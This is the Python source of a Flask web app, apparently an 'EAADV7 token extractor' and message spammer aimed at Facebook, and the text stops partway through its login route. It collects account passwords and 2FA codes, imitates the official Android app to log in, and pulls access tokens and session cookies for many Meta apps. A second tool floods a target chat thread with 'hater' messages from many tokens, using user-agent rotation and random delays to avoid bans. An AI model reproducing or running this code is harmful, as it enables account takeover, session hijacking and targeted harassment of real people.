from flask import Flask, request, render_template_string, jsonify
import requests
import uuid
import time
import base64
import io
import struct
import random
import string
import json
import re
from threading import Thread, Event
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import os
import copy

app = Flask(__name__)

# ==========================================
# 1. FACEBOOK ENCRYPTION & TOKEN LOGIC
# ==========================================
class FacebookPasswordEncryptor:
    @staticmethod
    def get_public_key():
        try:
            url = 'https://b-graph.facebook.com/pwd_key_fetch'
            params = {
                'version': '2', 'flow': 'CONTROLLER_INITIALIZATION', 'method': 'GET',
                'fb_api_req_friendly_name': 'pwdKeyFetch', 'fb_api_caller_class': 'com.facebook.auth.login.AuthOperations',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            }
            response = requests.post(url, params=params, timeout=30).json()
            return response.get('public_key'), str(response.get('key_id', '25'))
        except Exception:
            return None, "25"

    @staticmethod
    def encrypt(password, public_key=None, key_id="25"):
        if public_key is None:
            public_key, key_id = FacebookPasswordEncryptor.get_public_key()
            if public_key is None:
                return password
        try:
            rand_key = get_random_bytes(32)
            iv = get_random_bytes(12)
            pubkey = RSA.import_key(public_key)
            cipher_rsa = PKCS1_v1_5.new(pubkey)
            encrypted_rand_key = cipher_rsa.encrypt(rand_key)
            cipher_aes = AES.new(rand_key, AES.MODE_GCM, nonce=iv)
            current_time = int(time.time())
            cipher_aes.update(str(current_time).encode("utf-8"))
            encrypted_passwd, auth_tag = cipher_aes.encrypt_and_digest(password.encode("utf-8"))
            buf = io.BytesIO()
            buf.write(bytes([1, int(key_id)]))
            buf.write(iv)
            buf.write(struct.pack("<h", len(encrypted_rand_key)))
            buf.write(encrypted_rand_key)
            buf.write(auth_tag)
            buf.write(encrypted_passwd)
            encoded = base64.b64encode(buf.getvalue()).decode("utf-8")
            return f"#PWD_FB4A:2:{current_time}:{encoded}"
        except:
            return password

sessions_data = {}

def get_eaadv7_token(master_token):
    """
    Extract EAADV7 token using multiple methods
    EAADV7 = Facebook Lite app token
    """
    tokens_dict = {}
    cookies_dict = {}
    
    # Store master token
    tokens_dict['Master Token (EAAG)'] = master_token
    
    # Headers for requests
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': 'https://www.facebook.com/',
        'Origin': 'https://www.facebook.com',
        'Connection': 'keep-alive'
    }
    
    # Method 1: auth.getSessionforApp (Classic Method)
    app_configs = [
        ('Pages Manager (EAAB)', '165907476854626'),
        ('Instagram (EAAI)', '124024574287414'),
        ('Lite Token (EAADV)', '275254692598279'),
        ('Business Manager (EAAC)', '1416565041753390'),
        ('Ads Manager (EAAZ)', '936132729899398'),
        ('Messenger (EAAM)', '1477721120892874'),
        ('Facebook App (EAAD)', '350685531728'),
    ]
    
    for name, app_id in app_configs:
        try:
            # GET method
            url = "https://api.facebook.com/method/auth.getSessionforApp"
            params = {
                'access_token': master_token,
                'format': 'json',
                'new_app_id': app_id,
                'generate_session_cookies': '1',
                'sdk_version': 'v18.0',
                'app_version': '473.0.0.45.85'
            }
            res = requests.get(url, params=params, headers=headers, timeout=30).json()
            
            if 'access_token' in res:
                tokens_dict[name] = res['access_token']
                if 'session_cookies' in res:
                    cookies_dict[name] = res['session_cookies']
                continue
                
            # POST method if GET fails
            res_post = requests.post(url, data=params, headers=headers, timeout=30).json()
            if 'access_token' in res_post:
                tokens_dict[name] = res_post['access_token']
                if 'session_cookies' in res_post:
                    cookies_dict[name] = res_post['session_cookies']
                    
        except Exception as e:
            pass
    
    # Method 2: Graph API - Get Page Tokens (EAADV can be here)
    try:
        pages_url = "https://graph.facebook.com/v18.0/me/accounts"
        pages_params = {'access_token': master_token, 'limit': 100}
        pages_res = requests.get(pages_url, params=pages_params, headers=headers, timeout=30).json()
        
        if 'data' in pages_res:
            for page in pages_res['data']:
                page_name = page.get('name', 'Unknown')
                page_token = page.get('access_token', '')
                page_id = page.get('id', '')
                
                if page_token:
                    # Check if token starts with EAADV
                    if page_token.startswith('EAADV'):
                        tokens_dict[f'EAADV7 (Page: {page_name})'] = page_token
                    else:
                        tokens_dict[f'Page Token ({page_name})'] = page_token
                    
                    # Try to get EAADV7 from page token
                    try:
                        eaadv_url = "https://graph.facebook.com/v18.0/oauth/access_token"
                        eaadv_params = {
                            'grant_type': 'fb_exchange_token',
                            'client_id': '275254692598279',  # Lite app ID
                            'client_secret': 'd3ad07e6fa9d95c7e5d3f3a3f7b3b3b3',  # Generic
                            'fb_exchange_token': page_token
                        }
                        eaadv_res = requests.get(eaadv_url, params=eaadv_params, headers=headers, timeout=30).json()
                        if 'access_token' in eaadv_res and eaadv_res['access_token'].startswith('EAADV'):
                            tokens_dict[f'EAADV7 (From Page: {page_name})'] = eaadv_res['access_token']
                    except:
                        pass
    except Exception:
        pass
    
    # Method 3: Direct EAADV7 extraction using b-graph API
    try:
        # Try to get token for Lite app directly
        lite_url = "https://b-graph.facebook.com/auth/getSessionforApp"
        lite_params = {
            'access_token': master_token,
            'new_app_id': '275254692598279',
            'format': 'json',
            'generate_session_cookies': '1'
        }
        lite_headers = {
            'User-Agent': '[FBAN/FB4A;FBAV/473.0.0.45.85;FBBV/615875241;FBDM/{density=3.0,width=1080,height=2340};FBLC/en_US;FBRV/0;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S918B;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]',
            'Accept': 'application/json'
        }
        lite_res = requests.get(lite_url, params=lite_params, headers=lite_headers, timeout=30).json()
        
        if 'access_token' in lite_res:
            tokens_dict['EAADV7 (Direct)'] = lite_res['access_token']
            if 'session_cookies' in lite_res:
                cookies_dict['EAADV7'] = lite_res['session_cookies']
    except Exception:
        pass
    
    # Method 4: Try business integrations
    try:
        biz_url = "https://graph.facebook.com/v18.0/me/businesses"
        biz_params = {'access_token': master_token}
        biz_res = requests.get(biz_url, params=biz_params, headers=headers, timeout=30).json()
        
        if 'data' in biz_res:
            for business in biz_res['data']:
                biz_id = business.get('id')
                biz_name = business.get('name', 'Unknown')
                
                if biz_id:
                    # Get business token
                    biz_token_url = f"https://graph.facebook.com/v18.0/{biz_id}"
                    biz_token_params = {
                        'access_token': master_token,
                        'fields': 'access_token,permitted_roles'
                    }
                    biz_token_res = requests.get(biz_token_url, params=biz_token_params, headers=headers, timeout=30).json()
                    
                    if 'access_token' in biz_token_res:
                        biz_token = biz_token_res['access_token']
                        if biz_token.startswith('EAADV'):
                            tokens_dict[f'EAADV7 (Business: {biz_name})'] = biz_token
                        else:
                            tokens_dict[f'Business Token ({biz_name})'] = biz_token
    except Exception:
        pass
    
    # Method 5: Instagram Business Token (often EAADV)
    try:
        ig_url = "https://graph.facebook.com/v18.0/me/instagram_accounts"
        ig_params = {'access_token': master_token}
        ig_res = requests.get(ig_url, params=ig_params, headers=headers, timeout=30).json()
        
        if 'data' in ig_res:
            for ig_account in ig_res['data']:
                ig_id = ig_account.get('id')
                ig_username = ig_account.get('username', 'Unknown')
                
                if ig_id:
                    ig_token_url = f"https://graph.facebook.com/v18.0/{ig_id}"
                    ig_token_params = {
                        'access_token': master_token,
                        'fields': 'access_token'
                    }
                    ig_token_res = requests.get(ig_token_url, params=ig_token_params, headers=headers, timeout=30).json()
                    
                    if 'access_token' in ig_token_res:
                        ig_token = ig_token_res['access_token']
                        if ig_token.startswith('EAADV'):
                            tokens_dict[f'EAADV7 (IG: {ig_username})'] = ig_token
    except Exception:
        pass
    
    # Method 6: Exchange token for EAADV7
    try:
        exchange_url = "https://graph.facebook.com/v18.0/oauth/access_token"
        exchange_params = {
            'grant_type': 'fb_exchange_token',
            'client_id': '275254692598279',
            'fb_exchange_token': master_token
        }
        exchange_res = requests.get(exchange_url, params=exchange_params, headers=headers, timeout=30).json()
        
        if 'access_token' in exchange_res:
            new_token = exchange_res['access_token']
            if new_token.startswith('EAADV'):
                tokens_dict['EAADV7 (Exchanged)'] = new_token
            elif not any(v.startswith('EAADV') for v in tokens_dict.values()):
                # If no EAADV found yet, try this token
                tokens_dict['Exchanged Token'] = new_token
    except Exception:
        pass
    
    return {'tokens': tokens_dict, 'cookies': cookies_dict}

def format_cookies_for_use(cookies_data):
    """Format cookies for easy use in requests"""
    formatted = {}
    if isinstance(cookies_data, list):
        for cookie in cookies_data:
            if isinstance(cookie, dict):
                name = cookie.get('name', cookie.get('key', ''))
                value = cookie.get('value', '')
                if name and value:
                    formatted[name] = value
    elif isinstance(cookies_data, dict):
        formatted = cookies_data
    
    cookie_string = '; '.join([f"{k}={v}" for k, v in formatted.items()])
    return {'dict': formatted, 'string': cookie_string}

# ==========================================
# 2. ANTI-BAN MESSAGE SENDER LOGIC
# ==========================================
tasks = {}

def send_messages(task_id, access_tokens, thread_id, messages, speed, hater_name):
    task = tasks.get(task_id)
    if not task:
        return

    user_agents = [
        'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    ]

    while not task['stop_event'].is_set():
        for message in messages:
            if task['stop_event'].is_set():
                break
            
            for token in access_tokens:
                if task['stop_event'].is_set():
                    break
                
                full_message = f"{hater_name} {message}" if hater_name else message
                
                endpoints = [
                    f"https://graph.facebook.com/v18.0/t_{thread_id}",
                    f"https://graph.facebook.com/v17.0/t_{thread_id}",
                    f"https://graph.facebook.com/v15.0/t_{thread_id}",
                    f"https://b-graph.facebook.com/v18.0/t_{thread_id}",
                ]
                
                sent = False
                for url in endpoints:
                    if sent:
                        break
                    
                    parameters = {'access_token': token, 'message': full_message}
                    headers = {
                        'User-Agent': random.choice(user_agents),
                        'Accept': 'application/json',
                    }
                    
                    try:
                        response = requests.post(url, data=parameters, headers=headers, timeout=30)
                        if response.status_code == 200:
                            print(f"[{task_id}] Success: {full_message}")
                            sent = True
                        else:
                            error_data = response.json() if response.text else {}
                            if 'error' in error_data:
                                error_code = error_data['error'].get('code', 0)
                                if error_code in [190, 102, 368]:
                                    sent = True
                                    break
                    except Exception:
                        pass
                
                jitter = random.uniform(0.5, 2.0)
                time.sleep(speed + jitter)

# ==========================================
# 3. HTML UI
# ==========================================

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EAADV7 TOKEN EXTRACTOR</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #f1f5f9;
            font-family: 'Poppins', sans-serif;
            min-height: 100vh;
            padding: 20px;
        }
        .main-container { max-width: 650px; margin: 0 auto; }
        h1.main-title {
            text-align: center;
            font-weight: 800;
            font-size: 28px;
            background: linear-gradient(90deg, #00d2ff 0%, #00ff88 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 5px;
        }
        p.subtitle { text-align: center; color: #94a3b8; font-size: 14px; margin-bottom: 25px; }
        
        .nav-tabs { border-bottom: 1px solid rgba(255,255,255,0.1); margin-bottom: 20px; }
        .nav-tabs .nav-link { 
            color: #94a3b8; font-weight: 600; border: none; background: transparent;
            padding: 12px 20px; border-radius: 10px 10px 0 0;
        }
        .nav-tabs .nav-link.active {
            color: #fff; background: rgba(30, 41, 59, 0.9); border-bottom: 3px solid #00ff88;
        }
        
        .main-card {
            background: rgba(30, 41, 59, 0.9);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 0 0 20px 20px;
            padding: 30px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }
        .form-label { font-weight: 600; color: #cbd5e1; font-size: 13px; margin-bottom: 5px; }
        .form-control, .form-select {
            background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(255, 255, 255, 0.1);
            color: #fff; border-radius: 10px; padding: 12px; font-size: 14px; margin-bottom: 15px;
        }
        .form-control:focus, .form-select:focus {
            background: rgba(15, 23, 42, 0.9); border-color: #00ff88; color: #fff; box-shadow: none;
        }
        
        .btn-gradient {
            background: linear-gradient(90deg, #00d2ff 0%, #00ff88 100%);
            border: none; border-radius: 10px; padding: 12px;
            font-weight: 700; color: #0f172a; width: 100%; transition: all 0.3s;
        }
        .btn-gradient:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0, 255, 136, 0.4); }
        
        .btn-stop {
            background: linear-gradient(90deg, #ef4444 0%, #dc2626 100%);
            color: white; border: none; font-weight: 700;
            border-radius: 0 10px 10px 0;
        }
        
        .token-item {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            border-radius: 12px; padding: 15px;
            margin-bottom: 15px; border: 1px solid #334155;
        }
        .token-item.eaadv {
            border: 2px solid #00ff88;
            background: linear-gradient(135deg, #064e3b 0%, #0f172a 100%);
        }
        .token-item label { color: #00d2ff; font-weight: 600; font-size: 13px; }
        .token-item.eaadv label { color: #00ff88; }
        .token-item textarea {
            width: 100%; background: rgba(0,0,0,0.3); color: #fff;
            border: 1px solid #334155; border-radius: 8px; padding: 10px;
            font-family: monospace; font-size: 11px; resize: none; height: 70px;
        }
        .btn-copy {
            background: linear-gradient(90deg, #10b981 0%, #059669 100%);
            color: white; font-size: 12px; padding: 6px 15px;
            border-radius: 6px; border: none; font-weight: 600;
        }
        
        .cookie-item {
            background: linear-gradient(135deg, #2d1b4e 0%, #1e1b4b 100%);
            border-radius: 12px; padding: 15px;
            margin-bottom: 15px; border: 1px solid #4c1d95;
        }
        .cookie-item label { color: #a78bfa; font-weight: 600; font-size: 13px; }
        .cookie-item textarea {
            width: 100%; background: rgba(0,0,0,0.3); color: #e9d5ff;
            border: 1px solid #4c1d95; border-radius: 8px; padding: 10px;
            font-family: monospace; font-size: 10px; resize: none; height: 100px;
        }
        
        .whatsapp-btn {
            background: linear-gradient(90deg, #25D366 0%, #128C7E 100%);
            color: white; border-radius: 50px; padding: 12px 30px;
            text-decoration: none; display: flex; align-items: center;
            justify-content: center; gap: 8px; font-weight: 600;
            margin-top: 25px; transition: all 0.3s;
        }
        .whatsapp-btn:hover { transform: translateY(-3px); color: white; }
        
        .hidden { display: none !important; }
        .error-text { color: #ef4444; font-size: 13px; font-weight: 600; margin-top: 10px; text-align: center; }
        .success-text { color: #00ff88; font-size: 13px; font-weight: 600; margin-top: 10px; text-align: center; }
        
        .badge-eaadv {
            background: linear-gradient(90deg, #00ff88 0%, #10b981 100%);
            color: #0f172a; font-size: 10px; padding: 2px 8px;
            border-radius: 10px; margin-left: 5px; font-weight: 700;
        }
        
        .stats-box {
            background: rgba(15, 23, 42, 0.6); border-radius: 10px;
            padding: 15px; margin-bottom: 20px; text-align: center;
        }
        .stats-box h5 { color: #00ff88; font-size: 24px; margin: 0; }
        .stats-box p { color: #94a3b8; font-size: 12px; margin: 0; }
        
        .tab-section {
            background: rgba(15, 23, 42, 0.4); border-radius: 10px;
            padding: 10px 15px; margin-bottom: 15px; cursor: pointer;
        }
        .tab-section.active { border-left: 3px solid #00ff88; }
    </style>
</head>
<body>

<div class="main-container">
    <h1 class="main-title"><i class="fas fa-key"></i> EAADV7 EXTRACTOR</h1>
    <p class="subtitle">Get EAADV7 Token + All Other Tokens</p>

    <ul class="nav nav-tabs" id="myTab" role="tablist">
        <li class="nav-item" role="presentation">
            <button class="nav-link active" id="extractor-tab" data-bs-toggle="tab" data-bs-target="#extractor" type="button" role="tab">
                <i class="fas fa-key"></i> Token Extractor
            </button>
        </li>
        <li class="nav-item" role="presentation">
            <button class="nav-link" id="server-tab" data-bs-toggle="tab" data-bs-target="#server" type="button" role="tab">
                <i class="fas fa-paper-plane"></i> Message Server
            </button>
        </li>
    </ul>

    <div class="tab-content main-card">
        
        <div class="tab-pane fade show active" id="extractor" role="tabpanel">
            <form id="loginForm">
                <label class="form-label"><i class="fas fa-user"></i> Facebook ID / Email / Number</label>
                <input type="text" id="uid" name="uid" class="form-control" placeholder="Enter FB ID" required>
                
                <label class="form-label"><i class="fas fa-lock"></i> Password</label>
                <input type="password" id="password" name="password" class="form-control" placeholder="Enter Password" required>
                
                <button type="submit" id="extBtn" class="btn-gradient">
                    <i class="fas fa-magic"></i> EXTRACT EAADV7 TOKEN
                </button>
            </form>

            <form id="twoFactorForm" class="hidden mt-3">
                <label class="form-label" style="color: #f59e0b;">
                    <i class="fas fa-shield-alt"></i> 2FA Code Required
                </label>
                <input type="text" id="otp" name="otp" class="form-control" placeholder="Enter 6-digit OTP" required>
                <button type="submit" id="otpBtn" class="btn-gradient">
                    <i class="fas fa-check-circle"></i> Verify & Extract
                </button>
            </form>

            <div id="extError" class="error-text"></div>
            <div id="extSuccess" class="success-text"></div>

            <div id="tokenResultBox" class="hidden mt-4">
                <div class="row mb-3">
                    <div class="col-6">
                        <div class="stats-box">
                            <h5 id="tokenCount">0</h5>
                            <p>Tokens Found</p>
                        </div>
                    </div>
                    <div class="col-6">
                        <div class="stats-box">
                            <h5 id="cookieCount">0</h5>
                            <p>Cookies Found</p>
                        </div>
                    </div>
                </div>
                
                <div class="tab-section active" onclick="showSection('tokens')">
                    <i class="fas fa-key" style="color: #00ff88;"></i> <strong>Access Tokens</strong>
                </div>
                <div class="tab-section" onclick="showSection('cookies')">
                    <i class="fas fa-cookie-bite" style="color: #a78bfa;"></i> <strong>Session Cookies</strong>
                </div>
                
                <div id="tokensSection">
                    <div id="tokensContainer" style="max-height: 400px; overflow-y: auto;"></div>
                </div>
                
                <div id="cookiesSection" class="hidden">
                    <div id="cookiesContainer" style="max-height: 400px; overflow-y: auto;"></div>
                </div>
                
                <button class="btn btn-secondary w-100 mt-3" onclick="resetExtForm()">
                    <i class="fas fa-redo"></i> Extract Another Account
                </button>
            </div>
        </div>

        <div class="tab-pane fade" id="server" role="tabpanel">
            <form id="taskForm" enctype="multipart/form-data">
                <label class="form-label"><i class="fas fa-database"></i> Token Method</label>
                <select class="form-select" name="token_type" id="tokenType">
                    <option value="single">Paste Single Token</option>
                    <option value="multi">Upload Tokens File (.txt)</option>
                </select>
                
                <div id="singleTokenBox">
                    <label class="form-label"><i class="fas fa-key"></i> Access Token</label>
                    <input type="text" class="form-control" name="single_token" placeholder="EAADV7... / EAAG...">
                </div>
                
                <div id="multiTokenBox" class="hidden">
                    <label class="form-label"><i class="fas fa-file-upload"></i> Upload Tokens (.txt)</label>
                    <input type="file" class="form-control" name="token_file" accept=".txt">
                </div>
                
                <label class="form-label"><i class="fas fa-user-tag"></i> Hater Name / Prefix</label>
                <input type="text" class="form-control" name="hater_name" placeholder="Enter Hater Name (optional)">

                <label class="form-label"><i class="fas fa-bullseye"></i> Target Thread ID (UID / Group ID)</label>
                <input type="text" class="form-control" name="thread_id" placeholder="Enter Target ID" required>
                
                <label class="form-label"><i class="fas fa-clock"></i> Base Speed (Seconds)</label>
                <input type="number" class="form-control" name="speed" value="5" min="1" required>
                <small style="color:#64748b; display:block; margin-top:-10px; margin-bottom:15px; font-size:11px;">
                    <i class="fas fa-info-circle"></i> Anti-ban random jitter auto-added
                </small>
                
                <label class="form-label"><i class="fas fa-file-alt"></i> Upload Messages File (.txt)</label>
                <input type="file" class="form-control" name="msg_file" accept=".txt" required>
                
                <button type="submit" id="serverBtn" class="btn-gradient">
                    <i class="fas fa-rocket"></i> START SERVER
                </button>
            </form>
            
            <hr style="border-color: rgba(255,255,255,0.1); margin: 25px 0;">
            
            <label class="form-label"><i class="fas fa-stop-circle"></i> Stop Running Task</label>
            <div class="input-group">
                <input type="text" id="stopTaskId" class="form-control" style="margin-bottom:0; border-radius: 10px 0 0 10px;" placeholder="Enter Task ID">
                <button onclick="stopTask()" class="btn btn-stop"><i class="fas fa-stop"></i> STOP</button>
            </div>
            
            <div id="serverStatus" class="mt-3 text-center" style="color: #10b981; font-weight: 600;"></div>
        </div>
    </div>

    <a href="https://wa.me/916394812128" target="_blank" class="whatsapp-btn">
        <i class="fab fa-whatsapp" style="font-size: 20px;"></i> CONTACT OWNER
    </a>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
    let currentSessionId = "";
    let allTokens = {};
    let allCookies = {};

    document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        submitExtData('/login', new FormData(document.getElementById('loginForm')), 'extBtn', '<i class="fas fa-magic"></i> EXTRACT EAADV7 TOKEN');
    });

    document.getElementById('twoFactorForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const fd = new FormData();
        fd.append('session_id', currentSessionId);
        fd.append('otp', document.getElementById('otp').value);
        submitExtData('/two_factor', fd, 'otpBtn', '<i class="fas fa-check-circle"></i> Verify & Extract');
    });

    async function submitExtData(endpoint, formData, btnId, originalText) {
        const btn = document.getElementById(btnId);
        const errBox = document.getElementById('extError');
        const successBox = document.getElementById('extSuccess');
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
        btn.disabled = true;
        errBox.innerText = "";
        successBox.innerText = "";

        try {
            const res = await fetch(endpoint, { method: 'POST', body: formData });
            const data = await res.json();

            if (data.tokens) {
                allTokens = data.tokens;
                allCookies = data.cookies || {};
                renderTokens(allTokens);
                renderCookies(allCookies);
                document.getElementById('loginForm').classList.add('hidden');
                document.getElementById('twoFactorForm').classList.add('hidden');
                document.getElementById('tokenResultBox').classList.remove('hidden');
                
                document.getElementById('tokenCount').innerText = Object.keys(allTokens).length;
                document.getElementById('cookieCount').innerText = Object.keys(allCookies).length;
                
                // Check if EAADV7 found
                const hasEaadv = Object.keys(allTokens).some(k => k.includes('EAADV'));
                if (hasEaadv) {
                    successBox.innerHTML = '<i class="fas fa-check-circle"></i> EAADV7 Token Found Successfully!';
                } else {
                    successBox.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Tokens extracted but EAADV7 not available for this account';
                }
            } else if (data.two_factor) {
                currentSessionId = data.session_id;
                document.getElementById('loginForm').classList.add('hidden');
                document.getElementById('twoFactorForm').classList.remove('hidden');
            } else {
                errBox.innerText = data.error || "Failed!";
            }
        } catch (err) {
            errBox.innerText = "Server Error!";
        }
        btn.innerHTML = originalText;
        btn.disabled = false;
    }

    function renderTokens(tokensObj) {
        const container = document.getElementById('tokensContainer');
        container.innerHTML = '';
        let c = 1;
        
        // Sort to show EAADV7 first
        const sortedEntries = Object.entries(tokensObj).sort((a, b) => {
            if (a[0].includes('EAADV')) return -1;
            if (b[0].includes('EAADV')) return 1;
            return 0;
        });
        
        for (const [name, val] of sortedEntries) {
            if (!val || val.startsWith('Error')) continue;
            
            const isEaadv = name.includes('EAADV') || val.startsWith('EAADV');
            const div = document.createElement('div');
            div.className = 'token-item' + (isEaadv ? ' eaadv' : '');
            div.innerHTML = `
                <div class="d-flex justify-content-between align-items-center mb-2">
                    <label>
                        <i class="fas fa-key"></i> ${name}
                        ${isEaadv ? '<span class="badge-eaadv">EAADV7</span>' : ''}
                    </label>
                    <button class="btn-copy" onclick="copyTk('t_${c}', this)">
                        <i class="fas fa-copy"></i> Copy
                    </button>
                </div>
                <textarea id="t_${c}" readonly spellcheck="false">${val}</textarea>
            `;
            container.appendChild(div);
            c++;
        }
        
        if (container.innerHTML === '') {
            container.innerHTML = '<p class="text-center text-warning" style="font-size:13px;"><i class="fas fa-exclamation-triangle"></i> No tokens generated.</p>';
        }
    }

    function renderCookies(cookiesObj) {
        const container = document.getElementById('cookiesContainer');
        container.innerHTML = '';
        let c = 1;
        
        for (const [name, val] of Object.entries(cookiesObj)) {
            if (!val) continue;
            
            let displayVal = val;
            if (typeof val === 'object') {
                displayVal = JSON.stringify(val, null, 2);
            }
            
            const div = document.createElement('div');
            div.className = 'cookie-item';
            div.innerHTML = `
                <div class="d-flex justify-content-between align-items-center mb-2">
                    <label><i class="fas fa-cookie-bite"></i> ${name}</label>
                    <button class="btn-copy" onclick="copyTk('c_${c}', this)">
                        <i class="fas fa-copy"></i> Copy
                    </button>
                </div>
                <textarea id="c_${c}" readonly spellcheck="false">${displayVal}</textarea>
            `;
            container.appendChild(div);
            c++;
        }
        
        if (container.innerHTML === '') {
            container.innerHTML = '<p class="text-center text-warning" style="font-size:13px;"><i class="fas fa-exclamation-triangle"></i> No cookies extracted.</p>';
        }
    }

    function showSection(section) {
        document.querySelectorAll('.tab-section').forEach(el => el.classList.remove('active'));
        event.currentTarget.classList.add('active');
        
        if (section === 'tokens') {
            document.getElementById('tokensSection').classList.remove('hidden');
            document.getElementById('cookiesSection').classList.add('hidden');
        } else {
            document.getElementById('tokensSection').classList.add('hidden');
            document.getElementById('cookiesSection').classList.remove('hidden');
        }
    }

    function copyTk(id, btn) {
        document.getElementById(id).select();
        document.execCommand("copy");
        btn.innerHTML = '<i class="fas fa-check"></i> Copied';
        btn.style.background = '#059669';
        setTimeout(() => {
            btn.innerHTML = '<i class="fas fa-copy"></i> Copy';
            btn.style.background = '';
        }, 2000);
    }

    function resetExtForm() {
        document.getElementById('loginForm').reset();
        document.getElementById('twoFactorForm').reset();
        document.getElementById('tokenResultBox').classList.add('hidden');
        document.getElementById('loginForm').classList.remove('hidden');
        document.getElementById('extSuccess').innerText = '';
        currentSessionId = '';
        allTokens = {};
        allCookies = {};
    }

    document.getElementById('tokenType').addEventListener('change', function() {
        if (this.value === 'single') {
            document.getElementById('singleTokenBox').classList.remove('hidden');
            document.getElementById('multiTokenBox').classList.add('hidden');
        } else {
            document.getElementById('singleTokenBox').classList.add('hidden');
            document.getElementById('multiTokenBox').classList.remove('hidden');
        }
    });

    document.getElementById('taskForm').onsubmit = async (e) => {
        e.preventDefault();
        const btn = document.getElementById('serverBtn');
        const status = document.getElementById('serverStatus');
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Starting...';
        btn.disabled = true;
        
        try {
            const res = await fetch('/start', { method: 'POST', body: new FormData(e.target) });
            const data = await res.json();
            if (data.success) {
                status.innerHTML = `✅ TASK STARTED!<br>Save this ID: <strong style="color:#00ff88; font-size:18px;">${data.task_id}</strong>`;
                e.target.reset();
            } else {
                status.innerHTML = `<span style="color:#ef4444;"><i class="fas fa-exclamation-circle"></i> Error: ${data.message}</span>`;
            }
        } catch (err) {
            status.innerHTML = `<span style="color:#ef4444;"><i class="fas fa-times-circle"></i> Request failed!</span>`;
        }
        btn.innerHTML = '<i class="fas fa-rocket"></i> START SERVER';
        btn.disabled = false;
    };

    async function stopTask() {
        const tId = document.getElementById('stopTaskId').value;
        const status = document.getElementById('serverStatus');
        if (!tId) return alert("Please enter Task ID");
        
        try {
            const res = await fetch('/stop', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({task_id: tId})
            });
            const data = await res.json();
            if (data.success) {
                status.innerHTML = `<span style="color:#ef4444;"><i class="fas fa-stop-circle"></i> ${data.message}</span>`;
            } else {
                status.innerHTML = `<span style="color:#ef4444;"><i class="fas fa-exclamation-circle"></i> Error: ${data.message}</span>`;
            }
        } catch (err) {
            status.innerHTML = `<span style="color:#ef4444;"><i class="fas fa-times-circle"></i> Stop request failed.</span>`;
        }
    }
</script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

# --- EXTRACTOR ROUTES ---
@app.route('/login', methods=['POST'])
def login():
    try:
        uid = request.form.get('uid')
        password = request.form.get('password')
        if not uid or not password:
            return jsonify({'error': 'Email and Password are required'})
        
        enc_pw = FacebookPasswordEncryptor.encrypt(password)
        adid, dev_id, fam_id = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if client_ip:
            client_ip = client_ip.split(',')[0].strip()
        else:
            client_ip = request.remote_addr

        headers = {
            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "X-FB-Connection-Quality": "EXCELLENT",
            "X-FB-Connection-Type": "WIFI",
            "X-FB-SIM-HNI": "310260",
            "X-FB-Net-HNI": "310260",
            "X-Forwarded-For": client_ip,
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; SM-S918B Build/TP1A.220624.014) [FBAN/FB4A;FBAV/473.0.0.45.85;FBPN/com.facebook.katana;FBLC/en_US;FBBV/615875241;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-S918B;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2340};FB_FW/1;FBRV/0;]",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*"
        }
        
        data = {
            "adid": adid,
            "format": "json",
            "device_id": dev_id,
